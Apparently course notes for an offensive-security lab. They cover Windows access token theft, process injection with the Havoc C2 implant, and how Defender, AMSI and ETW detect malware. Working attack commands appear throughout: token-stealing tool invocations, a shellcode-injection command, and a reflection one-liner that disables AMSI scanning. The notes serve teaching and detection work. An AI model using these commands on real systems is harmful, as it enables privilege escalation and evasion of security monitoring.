<p>An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.</p>
<p>Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.</p>
<h1><a class="header" href="#mitre-2" id="mitre-2">MITRE</a></h1>
<p><img src="./images/token_mitre.jpg" alt="screenshot" /></p>
<h2><a class="header" href="#overview" id="overview">Overview</a></h2>
<p>Access token theft is a critical attack vector in Windows environments, allowing adversaries to impersonate high-privilege accounts such as <code>NT AUTHORITY\SYSTEM</code>. This tactic is aligned with MITRE ATT&amp;CK technique T1134 (Access Token Manipulation). While <code>winlogon.exe</code> is a common target, focusing only on it can limit detection capabilities.</p>
<p><img src="./images/token_overview.jpg" alt="screenshot" /></p>
<hr />
<h2><a class="header" href="#stealing-access-tokens" id="stealing-access-tokens">Stealing Access Tokens</a></h2>
<p>Attackers use several Windows API functions to steal and manipulate access tokens:</p>
<ul>
<li><code>OpenProcess()</code> – Opens a handle to a target process.</li>
<li><code>OpenProcessToken()</code> – Retrieves the access token from the process.</li>
<li><code>ImpersonateLoggedOnUser()</code> – Impersonates another user’s security context.</li>
<li><code>DuplicateTokenEx()</code> – Duplicates an existing token.</li>
<li><code>CreateProcessWithTokenW()</code> – Launches a new process with a token.</li>
</ul>
<p>These functions enable privilege escalation and lateral movement.</p>
<hr />
<h2><a class="header" href="#elevating-to-system-privileges" id="elevating-to-system-privileges">Elevating to SYSTEM Privileges</a></h2>
<p>Even if local admins have restricted privileges (e.g., no <code>SeDebugPrivilege</code>), SYSTEM processes retain them. By impersonating SYSTEM tokens, attackers bypass security restrictions and gain full system control.</p>
<hr />
<h2><a class="header" href="#detection-challenges" id="detection-challenges">Detection Challenges</a></h2>
<p>Most defenses focus on <code>winlogon.exe</code> as the source of SYSTEM tokens. This narrow focus can miss other viable SYSTEM processes that attackers may target. Broadening monitoring scope improves detection efficacy.</p>
<hr />
<h2><a class="header" href="#alternative-system-processes" id="alternative-system-processes">Alternative SYSTEM Processes</a></h2>
<p>Other SYSTEM processes that can be targeted include:</p>
<ul>
<li><code>services.exe</code> – Manages system services.</li>
<li><code>lsass.exe</code> – Handles authentication.</li>
<li><code>smss.exe</code> – Session manager.</li>
<li><code>csrss.exe</code> – Manages user-mode side of the Win32 subsystem.</li>
</ul>
<p>Monitoring these increases resilience to token theft.</p>
<hr />
<h2><a class="header" href="#defensive-measures" id="defensive-measures">Defensive Measures</a></h2>
<ul>
<li><strong>Audit SYSTEM Processes</strong> – Monitor for token misuse.</li>
<li><strong>Enforce Least Privilege</strong> – Restrict unnecessary privileges.</li>
<li><strong>Security Tools</strong> – Use tools that detect token-related anomalies.</li>
<li><strong>User Education</strong> – Train users against phishing and social engineering.</li>
</ul>
<hr />
<p>By understanding access token theft techniques and expanding detection beyond <code>winlogon.exe</code>, defenders can significantly improve Windows environment security.</p>
<p>Get-Token</p>
<p>The following Windows API calls can be used to steal and abuse access tokens: OpenProcess(), OpenProcessToken(), ImpersonateLoggedOnUser() , DuplicateTokenEx(), CreateProcessWithTokenW().</p>
<p><img src="./images/accesstoken.jpg" alt="Screenshot" /></p>
<pre><code>TokenPlayer-v0.8.exe --impersonate --pid 4536 --spawn
</code></pre>
<p>needs sedebugprivilege!
Admin in high integrity (UAC Bypass)</p>
<hr />
<h2><a class="header" href="#accesschkexe--p--f--v-3356" id="accesschkexe--p--f--v-3356">accesschk.exe -p -f -v 3356</a></h2>
<p>https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1</p>
<p>POWERSPLOIT</p>
<pre><code class="language-powershell">git clone https://github.com/PowerShellMafia/PowerSploit.git
cd .\PowerSploit\Privesc\
import-module .\Privesc.psd1
get-command -module Privesc
Get-ProcessTokenPrivilege
</code></pre>
<p>login as student
powershell
Start-Process -FilePath &quot;powershell.exe&quot; -Verb RunAs</p>
<h1><a class="header" href="#lab---token-theft" id="lab---token-theft">Lab - Token theft</a></h1>
<h2><a class="header" href="#access-token-theft-table-summary" id="access-token-theft-table-summary">Access Token Theft: Table Summary</a></h2>
<table><thead><tr><th><strong>Category</strong></th><th><strong>Details</strong></th></tr></thead><tbody>
<tr><td><strong>Threat</strong></td><td>Access token theft for privilege escalation and impersonation of SYSTEM-level accounts</td></tr>
<tr><td><strong>MITRE ATT&amp;CK</strong></td><td>T1134 – Access Token Manipulation</td></tr>
<tr><td><strong>Common APIs Used</strong></td><td><code>OpenProcess()</code>, <code>OpenProcessToken()</code>, <code>ImpersonateLoggedOnUser()</code>, <code>DuplicateTokenEx()</code>, <code>CreateProcessWithTokenW()</code></td></tr>
<tr><td><strong>Typical Target Process</strong></td><td><code>winlogon.exe</code> (commonly abused for SYSTEM token impersonation)</td></tr>
<tr><td><strong>Alternative Targets</strong></td><td><code>services.exe</code>, <code>lsass.exe</code>, <code>smss.exe</code>, <code>csrss.exe</code></td></tr>
<tr><td><strong>Why SYSTEM Tokens?</strong></td><td>SYSTEM retains powerful privileges (e.g., <code>SeDebugPrivilege</code>) even when restricted for local admins</td></tr>
<tr><td><strong>Detection Challenge</strong></td><td>Over-reliance on monitoring <code>winlogon.exe</code> can overlook token theft using other SYSTEM processes</td></tr>
<tr><td><strong>Defensive Actions</strong></td><td>- Audit all SYSTEM processes<br>- Enforce least privilege<br>- Deploy security tooling<br>- Educate users</td></tr>
</tbody></table>
<p><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/A_Process_is_No_One.pdf">https://specterops.io/wp-content/uploads/sites/3/2022/06/A_Process_is_No_One.pdf</a></p>
<blockquote>
<p><em><strong>MITIGATION</strong></em>: The <code>SeDebugPrivilege</code> can be removed from the local administrator group (by using Group policies) to make it harder for an attacker to dump credentials or interact with memory of other processes. However, <strong>privileges cannot be revoked</strong> from the <code>SYSTEM account</code> as they are necessary for the operating system to run. This makes SYSTEM access tokens extremely valuable for attackers in hardened environments. </p>
</blockquote>
<blockquote>
<p>PRIVILEGES NEEDED:</p>
<ol>
<li><code>High Integrity</code> -&gt; this is needed to access process running in HIGH integrity (i.e. <code>NT AUTHORITY/SYSTEM</code>)</li>
<li>SeDebugPrivilege</li>
<li>SeImpersonateUser</li>
<li>AdjustTokenPrivileges</li>
</ol>
</blockquote>
<ol>
<li><a href="https://github.com/S1ckB0y1337/TokenPlayer">https://github.com/S1ckB0y1337/TokenPlayer</a></li>
<li><a href="https://github.com/0xbadjuju/Tokenvator">https://github.com/0xbadjuju/Tokenvator</a></li>
</ol>
<pre><code class="language-git">git clone --recursive https://github.com/0xbadjuju/Tokenvator.git
Tokenvator.exe GetSystem /Process:3016 /command:'cmd.exe
</code></pre>
<p><img src="./images/token_tokenplayer.jpg" alt="Screenshot" /></p>
<p><img src="./images/token_si.jpg" alt="Screenshot" /></p>
<hr />
<p>Let's see if we can use our HAVOC demon implant to escalate our privileges from Admin (we'll start with high integrity here as we have already demonstrated how we can get there) to NT AUTHORITY. First clean up all your current implants by selecting each one and marking them as <code>dead</code> , <code>EXIT PROCESS</code> and finally <code>remove</code> the implant from our GUI.</p>
<p><img src="./images/labtoken_dead.jpg" alt="Screenshot" /></p>
<p><img src="./images/labtoken_exit.jpg" alt="Screenshot" /></p>
<p><img src="./images/labtoken_remove.jpg" alt="Screenshot" /></p>
<p>Now let's start a new demon implant running with Threatadmin, this will automatically spawn a new session in high integrity.</p>
<p>Open a command prompt and type the following</p>
<pre><code class="language-powershell">whoami /groups
c:\temp\demon.x64.exe
</code></pre>
<p><img src="./images/labtoken_demonhigh.jpg" alt="Screenshot" /></p>
<p>We'll see a new session spawn in our Havoc GUI, let's interact with it using the <code>TOKEN</code> module and do a <code>whoami</code> to check our privileges.</p>
<p><img src="./images/labtoken_whoami.jpg" alt="Screenshot" /></p>
<p><img src="./images/labtoken_find.jpg" alt="Screenshot" /></p>
<p><img src="./images/labtoken_steal.jpg" alt="Screenshot" /></p>
<p><img src="./images/labtoken_spawn.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#lab---injection" id="lab---injection">Lab - Injection</a></h1>
<h2><a class="header" href="#summary-3" id="summary-3">SUMMARY</a></h2>
<p>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.</p>
<p>There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.</p>
<p>More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.</p>
<h2><a class="header" href="#mitre-3" id="mitre-3">MITRE</a></h2>
<p><img src="./images/labinject_mitre.jpg" alt="Screenshot" /></p>
<pre><code class="language-powershell">shellcode inject x64 684 /opt/havoc/payloads/demon.x64.bin
</code></pre>
<h1><a class="header" href="#lab---getsystem" id="lab---getsystem">Lab - GetSystem</a></h1>
<h1><a class="header" href="#chapter-01---windows-defender--mde-edr" id="chapter-01---windows-defender--mde-edr">Chapter 0.1 - Windows Defender / MDE (EDR)</a></h1>
<blockquote>
<p><em><strong>TL;DR :</strong></em> This chapter explains how most AV/EDR's work - in this case we'll focus on Microsoft Defender (the AV part), MDE (Microsoft Defender for Endpoint) which is the EDR component that we'll deal with later on.</p>
</blockquote>
<p><img src="./images/MDE.jpg" alt="Screenshot" /></p>
<h3><a class="header" href="#detection-techniques-used-by-markmicrosoft-defender-antivirusmark-not-mde" id="detection-techniques-used-by-markmicrosoft-defender-antivirusmark-not-mde">Detection Techniques Used by <mark>Microsoft Defender Antivirus</mark> (Not MDE!!!)</a></h3>
<table><thead><tr><th><strong>Detection Technique</strong></th><th><strong>Description</strong></th></tr></thead><tbody>
<tr><td><strong>Signature-Based Detection</strong></td><td>Compares files against a database of known malware signatures. Effective against known threats.</td></tr>
<tr><td><strong>Heuristic Analysis</strong></td><td>Examines the behavior and characteristics of files to identify potentially malicious activity.</td></tr>
<tr><td><strong>Behavioral Monitoring</strong></td><td>Monitors the behavior of applications and processes in real-time to detect and block malicious behavior.</td></tr>
<tr><td><strong>Machine Learning</strong></td><td>Uses machine learning models to analyze and classify files based on their characteristics.</td></tr>
<tr><td><strong>Cloud-Based Detection</strong></td><td>Sends suspicious files or metadata to the cloud for further analysis using advanced algorithms.</td></tr>
<tr><td><strong>Memory Scanning</strong></td><td>Scans the system's memory to detect and remove malware that resides in memory.</td></tr>
<tr><td><strong>Network Inspection</strong></td><td>Monitors network traffic for signs of malicious activity and blocks network-based attacks.</td></tr>
</tbody></table>
<h3><a class="header" href="#advanced-technologies" id="advanced-technologies">Advanced Technologies</a></h3>
<table><thead><tr><th><strong>Technology</strong></th><th><strong>Description</strong></th></tr></thead><tbody>
<tr><td><strong>Hybrid Detection and Protection</strong></td><td>Combines on-device detection with cloud-based analysis for faster and more effective threat detection.</td></tr>
<tr><td><strong>Behavior Monitoring Engine</strong></td><td>Continuously monitors for potential attacks post-execution.</td></tr>
<tr><td><strong>Specialized Machine Learning Models</strong></td><td>Uses models for different file types and behaviors to make real-time verdicts.</td></tr>
</tbody></table>
<h3><a class="header" href="#differences-between-microsoft-defender-antivirus-mda-and-microsoft-defender-for-endpoint-mde" id="differences-between-microsoft-defender-antivirus-mda-and-microsoft-defender-for-endpoint-mde">Differences Between Microsoft Defender Antivirus (MDA) and Microsoft Defender for Endpoint (MDE)</a></h3>
<table><thead><tr><th><strong>Feature</strong></th><th><strong>Microsoft Defender Antivirus (MDA)</strong></th><th><strong>Microsoft Defender for Endpoint (MDE)</strong></th></tr></thead><tbody>
<tr><td><strong>Endpoint Detection and Response (EDR)</strong></td><td>Not available</td><td>Provides advanced EDR capabilities to detect, investigate, and respond to threats.</td></tr>
<tr><td><strong>Threat and Vulnerability Management</strong></td><td>Not available</td><td>Offers comprehensive threat and vulnerability management to identify and remediate vulnerabilities.</td></tr>
<tr><td><strong>Attack Surface Reduction (ASR)</strong></td><td>Limited</td><td>Provides extensive ASR rules to reduce the attack surface and prevent exploit techniques.</td></tr>
<tr><td><strong>Automated Investigation and Remediation</strong></td><td>Not available</td><td>Automatically investigates and remediates threats using AI and automation.</td></tr>
<tr><td><strong>Advanced Threat Hunting</strong></td><td>Not available</td><td>Offers advanced threat hunting capabilities with detailed search queries and analytics.</td></tr>
<tr><td><strong>Integration with Microsoft 365</strong></td><td>Limited</td><td>Seamlessly integrates with Microsoft 365 and other enterprise security solutions.</td></tr>
<tr><td><strong>Sandboxing and Detonation</strong></td><td>Not available</td><td>Uses sandboxing to analyze and detonate suspicious files in a controlled environment.</td></tr>
<tr><td><strong>Behavioral Analytics and Anomaly Detection</strong></td><td>Basic</td><td>Employs advanced behavioral analytics and anomaly detection to identify sophisticated threats.</td></tr>
<tr><td><strong>Threat Intelligence and Analytics</strong></td><td>Limited</td><td>Leverages Microsoft's Threat Intelligence to provide real-time insights and analytics.</td></tr>
<tr><td><strong>Centralized Management and Reporting</strong></td><td>Basic</td><td>Provides centralized management, reporting, and alerting for enterprise environments.</td></tr>
</tbody></table>
<h3><a class="header" href="#summary-4" id="summary-4">Summary</a></h3>
<ul>
<li><strong>Endpoint Detection and Response (EDR):</strong> MDE provides advanced EDR capabilities that allow organizations to detect, investigate, and respond to threats in real-time. MDA does not offer these capabilities.</li>
<li><strong>Threat and Vulnerability Management:</strong> MDE offers tools to identify and remediate vulnerabilities across the organization's environment. MDA does not include this feature.</li>
<li><strong>Attack Surface Reduction (ASR):</strong> MDE provides comprehensive ASR rules to minimize the attack surface and prevent exploit techniques. MDA has limited ASR capabilities.</li>
<li><strong>Automated Investigation and Remediation:</strong> MDE uses AI and automation to automatically investigate and remediate threats. MDA does not have this capability.</li>
<li><strong>Advanced Threat Hunting:</strong> MDE offers advanced threat hunting capabilities, allowing security analysts to perform detailed searches and analytics. MDA does not include threat hunting features.</li>
<li><strong>Integration with Microsoft 365:</strong> MDE seamlessly integrates with Microsoft 365 and other enterprise security solutions, providing a unified security experience. MDA has limited integration with Microsoft 365.</li>
<li><strong>Sandboxing and Detonation:</strong> MDE uses sandboxing to analyze and detonate suspicious files in a controlled environment, providing detailed insights into their behavior. MDA does not offer sandboxing.</li>
<li><strong>Behavioral Analytics and Anomaly Detection:</strong> MDE employs advanced behavioral analytics and anomaly detection to identify sophisticated threats. MDA has basic behavioral monitoring.</li>
<li><strong>Threat Intelligence and Analytics:</strong> MDE leverages Microsoft's Threat Intelligence to provide real-time insights and analytics. MDA has limited threat intelligence capabilities.</li>
<li><strong>Centralized Management and Reporting:</strong> MDE offers centralized management, reporting, and alerting for enterprise environments, making it easier to manage security across multiple endpoints. MDA has basic management and reporting features.</li>
</ul>
<p>These differences highlight the advanced capabilities that Microsoft Defender for Endpoint (MDE) provides, making it suitable for enterprise environments with complex security needs.</p>
<p><img src="./images/howEDR.jpg" alt="Screenshot" />
<img src="./images/static.jpg" alt="Screenshot" />
<img src="./images/dynamic.jpg" alt="Screenshot" />
<img src="./images/behavior.jpg" alt="Screenshot" /></p>
<p><a href="https://www.edr-telemetry.com/windows.html">https://www.edr-telemetry.com/windows.html</a></p>
<h1><a class="header" href="#amsi-anti-malware-scanning-interface" id="amsi-anti-malware-scanning-interface">AMSI (Anti-Malware Scanning Interface)</a></h1>
<blockquote>
<p>WARNING : Amsi.dll is loaded into every powershell.exe process, but when running dotnet (csharp) binaries, amsi integrates directly with the clr which loads AMSI on demand. Amsi Bypasses that work in powershell don't necessariy work for the CLR integration.</p>
</blockquote>
<p>AmsiScanBuffer
AmsiScanString
AssemblyLoad</p>
<p>Show api calls made (user to kernel/syscall)</p>
<p>Languages</p>
<hr />
<ul>
<li>powershell (scripting)</li>
<li>vb.net (scripting)</li>
<li>c# (compiled)</li>
<li>f# (compiled)</li>
</ul>
<p><img src="./images/dotnet.jpeg" alt="dotnet" /></p>
<p>Here's a simplified diagram:</p>
<p><img src="./images/amsi_clr.jpg" alt="dotnet" /></p>
<p>AMSI</p>
<hr />
<p>Introduced in June 2015.</p>
<p>The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.</p>
<p>AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques.</p>
<p>The AMSI feature is integrated into these components of <code>Windows 10</code>:</p>
<ul>
<li>User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)</li>
<li>PowerShell <code>v5</code> (scripts, interactive use, and dynamic code evaluation)</li>
<li>Windows Script Host (Wscript.exe and Cscript.exe) (scripts and dynamic </li>
<li>Office365 (JavaScript/VBA)</li>
<li>Windows Management Instrumentation (WMI)</li>
<li>.Net Framework 4.8 (Scanning for all assemblies) - <em><strong>NEW</strong></em></li>
</ul>
<blockquote>
<p><strong>Runtime – Antimalware Scanning for All Assemblies</strong> : In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
</blockquote>
<p><a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
<p>.NET Framework 4.8 on Windows 10 triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
<p>In its default configuration, macros are scanned at runtime via AMSI except in the following scenarios:</p>
<ul>
<li>Documents opened while macro security settings are set to “Enable All Macros”</li>
<li>Documents opened from trusted locations</li>
<li>Documents that are trusted documents</li>
<li>Documents that contain VBA that is digitally signed by a trusted publisher</li>
</ul>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps">https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps</a></p>
<blockquote>
<p>Runtime – Antimalware Scanning for All Assemblies
In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
<p>.NET Framework 4.8 (released April 18th on Windows 10) triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
<p><strong>LINK</strong> : <a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
<p><strong>LINK</strong> : <a href="https://en.wikipedia.org/wiki/.NET_Framework_version_history">https://en.wikipedia.org/wiki/.NET_Framework_version_history</a></p>
</blockquote>
<p><img src="./images/amsi7archi.jpg" alt="image" /></p>
<h2><a class="header" href="#supported-os" id="supported-os">Supported OS</a></h2>
<ul>
<li>Windows 10 PRO/ENTERPRISE and Windows Server 2016 and later</li>
</ul>
<h2><a class="header" href="#supported-3rd-party-antivirusedr-vendors" id="supported-3rd-party-antivirusedr-vendors">Supported 3rd party Antivirus/EDR vendors</a></h2>
<ul>
<li>Windows Defender</li>
<li>Carbon Black Defense</li>
<li>Crowdstrike Falcon</li>
<li>Kaspersky</li>
<li>McAfee Endpoint Security 10.6.0 </li>
<li>Sophos</li>
<li>Symantec (v14.3 and later)</li>
<li>and a lot more...</li>
</ul>
<p><strong>LINK</strong> : <a href="https://github.com/subat0mik/whoamsi">https://github.com/subat0mik/whoamsi</a></p>
<p>To check which version of .net and the CLR is installed open a powershell prompt and type the following:</p>
<pre><code class="language-code">$psversiontable
[System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
$dotnet = [System.Reflection.Assembly]::Load(&quot;mscorlib&quot;)
$dotnet.GetName().Version
</code></pre>
<p><img src="./images/dotnetversion.jpg" alt="image" /></p>
<p>Let's see if our AMSI engine is working properly by doing a simple AMSI Test Sample (comparable to EICAR):</p>
<h2><a class="header" href="#amsitest" id="amsitest">AMSITEST</a></h2>
<pre><code class="language-yaml">Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
</code></pre>
<p><img src="./images/amsitest.jpg" alt="image" /></p>
<p>Even funnier, when you run the following command in a powershell console, AMSI will flag it as malicious, although the powershell script is not even available on your windows machine:</p>
<pre><code class="language-yaml">Invoke-Mimikatz
</code></pre>
<p><img src="./images/amsimimi.jpg" alt="image" /></p>
<blockquote>
<p><strong>Bypassing AMSI and how it works</strong></p>
</blockquote>
<p>As a first check, let's see in which process AMSI.dll has been loaded. Open a powershell prompt:</p>
<pre><code class="language-powershell">Get-Process | where {$_.modules.ModuleName -eq 'Amsi.dll'}
</code></pre>
<p><img src="./images/ps_amsips.jpg" alt="image" /></p>
<p>We can also use <code>SystemInformer</code> (previously known as <code>Process Hacker</code>) to verify, open <code>System Informer</code>, scroll down to your powershell process, right-click and select <code>properties</code>:</p>
<p><img src="./images/ps_si_ps.jpg" alt="image" /></p>
<p>Go to the <code>modules</code> tab, this will show all dll's loaded by the process, you will find the amsi.dll there indeed!</p>
<p><img src="./images/ps_si_amsi.jpg" alt="image" /></p>
<p>We're going to have a closer look at that AMSI.dll and see which functions it exports (more on functions later - just know that a windows program will load certain dll's from disk - these dll's contain common functions that Microsoft has made avaiable to make life a bit easier for developers :))</p>
<p><strong>Pre-requisites</strong>: dumpbin.exe /exports file.dll (requires visual studio c++ and msvc v142)</p>
<p><img src="./images/msvc142.jpg" alt="Screenshot" /></p>
<p><img src="./images/msvc_vs_dumpbin.jpg" alt="Screenshot" /></p>
<p>Open the &quot;Developer Command Prompt for Visual Studio 2019&quot;</p>
<p><img src="./images/ps_devprompt.jpg" alt="image" /></p>
<p>If we have a look at the amsi.dll's exported functions using dumpbin we see the forllowing functions are avaiable:</p>
<pre><code class="language-bash">dumpbin c:\windows\system32\amsi.dll /exports
</code></pre>
<pre><code class="language-bash">ordinal hint RVA      name

          1    0 00003860 AmsiCloseSession
          2    1 000034E0 AmsiInitialize
          3    2 00003800 AmsiOpenSession
 [+]      4    3 00003880 AmsiScanBuffer -&gt; scans the content of buffers
 [+]      5    4 00003980 AmsiScanString -&gt; scans the content of strings (variables)
          6    5 000039E0 AmsiUacInitialize
          7    6 00003C60 AmsiUacScan
          8    7 00003C00 AmsiUacUninitialize
          9    8 000037A0 AmsiUninitialize
         10    9 00001B00 DllCanUnloadNow
         11    A 00001B40 DllGetClassObject
         12    B 00001C80 DllRegisterServer
         13    C 00001C80 DllUnregisterServer
</code></pre>
<p>We can see here the AmsiScanBuffer and AmsiScanString functions we talked about earlier. So the question is, how to we bypass this functionality?</p>
<p>Luckily there are a ton of AMSI bypasses publicly available : (<a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a>)</p>
<p>In our next lab we'll be using &quot;Matt Graebers Reflection method&quot;, it's a simple one-liner which uses reflection to set the <code>amsiInitFailed</code> field to <code>$true</code>, and will also work in .NET binaries, not just in PowerShell. Let's have a look how it works before we implement it.</p>
<p><img src="./images/amsi_gitbypasses.jpg" alt="image" /></p>
<p><strong>&quot;Matt Graebers Reflection method&quot;</strong></p>
<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
</code></pre>
<h3><a class="header" href="#understanding-the-technique" id="understanding-the-technique">Understanding the Technique:</a></h3>
<p><strong>How it Works in <code>powershell</code>:</strong></p>
<ol>
<li><strong>Reflection:</strong> The core of this bypass relies on .NET reflection, which allows code to inspect and modify types, fields, and methods at runtime.</li>
<li><strong>Targeting <code>amsiInitFailed</code>:</strong> The code specifically targets the <code>amsiInitFailed</code> static field within the <code>System.Management.Automation.AmsiUtils</code> class. This field is used to indicate whether the AntiMalware Scan Interface (AMSI) initialization has failed.</li>
<li><strong>Setting to <code>$true</code>:</strong> By setting this field to <code>$true</code>, the code effectively tells the .NET runtime that AMSI initialization has failed, causing AMSI scans to be skipped.</li>
</ol>
<p><strong>How it Works in <code>.NET Binaries</code>:</strong></p>
<ol>
<li><strong>Locating <code>AmsiUtils</code>:</strong> Just like in PowerShell, you can use reflection in C# (or other .NET languages) to locate the <code>System.Management.Automation.AmsiUtils</code> class.</li>
<li><strong>Accessing <code>amsiInitFailed</code>:</strong> You can then use reflection to access the <code>amsiInitFailed</code> static field.</li>
<li><strong>Setting the Value:</strong> Finally, you can use reflection to set the value of the <code>amsiInitFailed</code> field to <code>true</code>.</li>
</ol>
<blockquote>
<p><strong>NOTE</strong>: Modern <code>EDR</code> solutions are designed to detect such reflection-based attacks. They often monitor for suspicious memory modifications and code behavior. <code>EDR</code>'s will hook functions and rely heavily on telemtry such as <code>ETW providers</code> (<em><strong>hint</strong></em> <em><strong>hint</strong></em>), of course these can also be bypassed. For now we focus on AV bypassing. </p>
</blockquote>
<p>In the next chapter we will briefly go over ETW and then we'll apply our knowledge on how to bypass <code>AMSI</code> and <code>ETW</code> in our next lab!</p>
<h1><a class="header" href="#etw---event-tracing-for-windows-kernel-mode" id="etw---event-tracing-for-windows-kernel-mode">ETW - Event Tracing for Windows (Kernel mode)</a></h1>
<blockquote>
<p><strong>TL;DR</strong> ETW basically is a kernel level debug logging mechanism in Windows - it allows to gather advanced telemetry about functions being called. <code>Windows Event Logs</code> contain a subset of ETW events. Typically used by application developers to debug programs, but has found its way as a telemetry source for <code>EDR's</code>. </p>
</blockquote>
<p>Event Tracing for Windows (ETW) is a high speed tracing facility built into Windows. Using a buffering and logging mechanism implemented in the operating system kernel, ETW provides an infrastructure for events raised by both user mode (apps) and kernel mode components (drivers). ETW can be used for system and app diagnosis, troubleshooting, and performance monitoring.</p>
<p><img src="./images/etwarch.jpg" alt="Screenshot" />
https://learn.microsoft.com/en-us/windows-hardware/test/weg/instrumenting-your-code-with-etw</p>
<p><em><strong>Provider</strong></em>
A provider is an instrumented component that generates events. A provider can be a user mode app, a kernel mode driver, or the Windows kernel itself. In addition to fixed event data (header), an event can carry user data.</p>
<p>An event is an event-based representation of data. The data can be used for in-depth analysis. An event can also be used to produce counters. Counters provide a sample-based view of data. They typically contain a small set of data to show current state, for example I/O bytes per second and interrupts per second.</p>
<p>A provider must register with ETW and send events by calling the ETW Logging APIs. Providers register a callback function for enable and disable notifications so that tracing can be enabled and disabled dynamically.</p>
<p><em><strong>Session</strong></em>
The ETW session infrastructure works as an intermediate broker that relays the events from one or more providers to the consumer. A session is a kernel object that collects events into kernel buffer and sends them to a specified file or real-time consumer process. Multiple providers can be mapped to a single session, which allows users to collect data from multiple sources.</p>
<p><em><strong>Controller</strong></em>
A controller starts, stops, or updates a trace session. A session is a unit for tracing. Providers are mapped (or enabled) to a specific session. A controller enables and disables providers so that they can start sending events to ETW. Controller functionalities can be invoked with tools provided by Microsoft or you can write your own app.</p>
<p>Logman.exe is an in-box controller app. Windows Performance Recorder (WPR) in the Windows Performance Toolkit is the recommended controller process.</p>
<p><em><strong>Consumer</strong></em>
A consumer is an app that reads a logged trace file (ETL file) or captures events in an active trace session in real time, and processes events. Event Viewer and Resource Monitor are in-box ETW consumer apps.</p>
<p>Windows Performance Analyzer (WPA) in the Windows Performance Toolkit is the recommended consumer process.</p>
<p>To see which ETW providers are running on the system</p>
<pre><code class="language-code">logman query -ets
</code></pre>
<p><img src="./images/etw_logmanets.jpg" alt="Screenshot" /></p>
<p>But there are a lot more ETW providers available:</p>
<p><img src="./images/etw_logmanproviders.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#interesting-etw-providers" id="interesting-etw-providers">Interesting ETW providers</a></h1>
<blockquote>
<ul>
<li>Microsoft-Windows-Kernel-Process</li>
<li>Microsoft-Windows-DotNETRuntime</li>
<li>Microsoft-Windows-Threat-Intelligence</li>
<li>Microsoft-Windows-Defender</li>
<li>Microsoft-Windows-PowerShell</li>
</ul>
</blockquote>
<p>So let's do a deep dive on what ETW can see in powershell by using logman to collect events to PowerShellTrace.etl.</p>
<p>You can search the available ETW providers like this:</p>
<pre><code class="language-powershell">logman  query providers | select-string &quot;powershell&quot;
</code></pre>
<p><img src="./images/etw_logmanqueryps.jpg" alt="Screenshot" /></p>
<p>And get detailed information like this:</p>
<pre><code class="language-powershell">logman query providers Microsoft-Windows-PowerShell
</code></pre>
<p><img src="./images/etw_logmanquery.jpg" alt="Screenshot" /></p>
<p>We'll set up an ETW tracing session for the powershell provider like this:</p>
<pre><code class="language-powershell">logman create trace PowerShellTrace -p Microsoft-Windows-PowerShell -o PowerShellTrace.etl -ets
logman -ets
</code></pre>
<p><img src="./images/etw_logmancreate.jpg" alt="Screenshot" /></p>
<p>This will create an event trace log (.etl file), which we can then convert to txt, csv or even evtx (windows event log format), any commands we run will be collected. In the same powershell console you just ran the create trace command, run some powershell commands:</p>
<pre><code class="language-powershell">$pid
get-process
</code></pre>
<blockquote>
<p><em><strong>IMPORTANT:</strong></em> After running our commands, stop the powershell event trace session and remove it (otherwise this keep collecting logs)</p>
</blockquote>
<pre><code class="language-powershell">logman stop PowerShellTrace -ets
Remove-EtwTraceSession -Name PowerShellTrace
</code></pre>
